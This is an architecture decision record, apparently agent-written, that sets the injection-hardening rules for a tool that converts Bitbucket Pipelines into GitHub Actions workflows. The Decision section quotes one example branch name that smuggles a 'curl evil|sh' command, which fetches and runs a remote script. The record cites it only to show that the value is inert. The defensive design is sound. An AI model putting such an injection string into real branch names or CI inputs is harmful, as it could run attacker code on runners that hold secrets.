# ADR-0161: safety rules of the generated workflows

- Status: agent-decided
- Date: 2026-10-08
- Task: T-057
- Affects: FAC-PIP-002, FAC-PIP-003

## Context

The source file is repository content that anyone with write access, or a contributor through a pull request, can influence. FAC-PIP-002 maps `BITBUCKET_BRANCH` and similar variables to `${{ … }}` expressions, and copies scripts, names and globs into a workflow that runs with the target's runners and secrets. Naive substitution is a script-injection vector (branch names and pull request titles are attacker-controlled).

## Decision

- **No source value inside an expression.** The only `${{ }}` text in a generated workflow is built from fixed templates: the table values of FAC-PIP-002, `vars.NAME`/`secrets.NAME` for names that exist in the `variables`/`secrets` facets (and match `^[A-Za-z_][A-Za-z0-9_]*$`), and `runner.os` and `hashFiles('<globs>')` in cache keys where each glob matches `^[A-Za-z0-9_.*/@-]+$`.
- **Variables reach scripts through `env:`, never by text substitution.** A script that reads `$BITBUCKET_BRANCH` keeps that text; the job gets `env: BITBUCKET_BRANCH: ${{ github.ref_name }}`. The value of the variable is the one the spec table gives, but the shell receives it as data, so a branch named `x";curl evil|sh;"` is inert. The same holds for repository, deployment and workspace variables and for `BITBUCKET_DEPLOYMENT_ENVIRONMENT` (a literal, validated environment name).
- **`${{` in any source string is unsupported.** A script line, name, path, glob, image, environment or key that contains `${{` is not copied (the line or value is dropped and its path listed), because GitHub would evaluate it. Control characters, newlines in one-line values, and NUL are rejected the same way. Free text that is copied (script lines, names, paths) is written through the YAML serializer, so it cannot break out of its scalar.
- **Allow-lists for structured values**: branch/tag globs `^[A-Za-z0-9_.*/-]+$` (no brace sets, character classes, `+`, `?`, `!`, quotes); images `^[A-Za-z0-9][A-Za-z0-9._/:@-]*$` (no variables, which also keeps the image public); environment names `^[A-Za-z0-9][A-Za-z0-9 _.-]*$`; service, cache and custom pipeline names are plain words or sanitised text. Object keys read from the source use own-property access, so `constructor`/`__proto__` never reach a prototype; the output is built from `Map`s.
- **Credentials.** Image `username`/`password` must each be a whole `$NAME` reference to a known variable or secret; literals are never copied into a workflow (the pair is then omitted and the path listed).
- **Pinned actions.** `actions/checkout` v4.2.2, `actions/cache` v4.2.0, `actions/upload-artifact` v4.6.0 and `actions/download-artifact` v4.1.8 are referenced by full commit SHA (read from the public tags), with the version in a trailing comment. Updating them is a code change with a test. These are the Node 20 v4 releases; they must move to the Node 24 majors once their commit SHAs can be verified against the public tags (follow-up).
- **Minimal permissions.** Every workflow sets `permissions: { contents: read }` at the top level; the checkout uses `persist-credentials: false`.
- **A manual step stops its pipeline.** A step with `trigger: manual` is not generated, and neither is anything after it in that pipeline (steps, parallel groups, stages): each later item is listed as unsupported with the reason that it follows a step waiting for approval. Otherwise a deploy after an approval step would run unattended on every push. A stage or parallel group is searched for a manual step (a stage that is too deep or large to inspect counts as gated). If nothing remains, no workflow is written for that pipeline. A step with `condition` is left out on its own (it only narrows when a step runs), and a step whose script has no translatable entry is also left out. `trigger: automatic` is the default and is accepted.
- **Variables per trigger.** `BITBUCKET_TAG` is bound only in tag workflows. `BITBUCKET_BRANCH` is bound in branch workflows (`github.ref_name`) and in the default workflow (`github.head_ref || github.ref_name`, because that workflow also runs for pull requests, where the ref is the merge ref). Elsewhere the variable would hold another kind of ref, so it stays unset and the script entry is listed as `<VAR> is unset in this trigger`.
- **`BITBUCKET_CLONE_DIR` in a container job.** The workspace is mounted at a different path inside the container, so the run script starts with `export BITBUCKET_CLONE_DIR="$GITHUB_WORKSPACE"` (and so does the after-script) instead of a `github.workspace` env entry.
- **Resource limits.** Aliases are capped at 100 (`yaml`'s expansion limit), duplicate keys and YAML warnings (non-plain tags such as `!!omap`) make the file invalid, and files over 1,000,000 characters are not parsed. Only plain objects count as mappings. Output bounds: at most 50 jobs per workflow (the target allows 256), 500 jobs and 4,000,000 characters of script text per file, 2,000,000 characters per generated workflow (a larger one is dropped and its pipeline listed), and 500 listed unsupported paths (then one more entry for the file). Every list of one step is bounded on its own, because an anchor can repeat a step 50 times: 200 entries looked at per list (1,000 for script lists), at most 10 distinct caches, 10 distinct services and 20 artifact globs per step (duplicates are dropped, the excess is listed), with cache and service variables and artifact globs charged to the text budget. The size of a workflow is estimated while it is built and no further step is added once it passes 2,000,000 characters. Tests aliasing a step 50 times with 20,000 caches, services, artifact globs and script lines each finish in under two seconds with a small result. Artifact downloads are one step per earlier producer, so the worst case is 50 x 50 steps, which a test measures (500 artifact-producing steps finish in well under a second and yield 50 jobs). Invalid input never throws; it yields no workflow and the unsupported path `bitbucket-pipelines.yml`.
- **Verification.** The corpus test parses every generated workflow and asserts: permissions, every `uses` pinned to a 40-hex SHA, every expression on the allow-list, no `${{` in any `run`, and balanced delimiters. The same checks run over a hostile-input matrix (every payload in every string slot).

## Alternatives

- Substitute `${{ github.ref_name }}` into the script text, as the spec table literally reads: rejected, it is the classic injection; the `env:` form gives the shell the same value as data.
- Copy script lines containing `${{` after escaping: GitHub Actions has no escape for `${{` in `run:`, so there is nothing safe to emit.
- Emit gated steps with `if: false`: rejected, it adds a construct the spec does not list and hides the omission.
- **Dropped `condition` steps.** A step omitted because of `condition` does not stop later steps, since a condition only narrows when a step runs. The reviewer of the Change Request must check that later steps do not depend on a dropped step (its artifacts, its side effects).
- **Round 3 bounds.** Key maps are bounded like lists: at most 200 keys of a step, item, clone, image, service, cache or `definitions` mapping are looked at (the excess is reported once); the keys that decide gating (`trigger`, `condition`) are read directly, so a long key list cannot hide them. When a list or key map that is followed by other work is truncated (parallel members, parallel and item keys), the dropped part is searched for a manual step, and one that cannot be inspected counts as a gate. Pattern sections (`branches`, `tags`, `custom`) examine at most 100 keys, and a workflow takes at most 100 exclusions, charged to the text budget; a workflow that would need more is not written. The size of a step is measured on the structure that is built (strings, keys, lists), and a step that would take the workflow past 1,800,000 characters is not added and is listed as too large, so the pipeline is truncated rather than dropped (the 2,000,000 check remains as a backstop). Duplicate-key detection is done by the translation in linear time, because the YAML library's own check is quadratic in the size of a mapping; parsing a 900 KB file still takes about a second in the library.
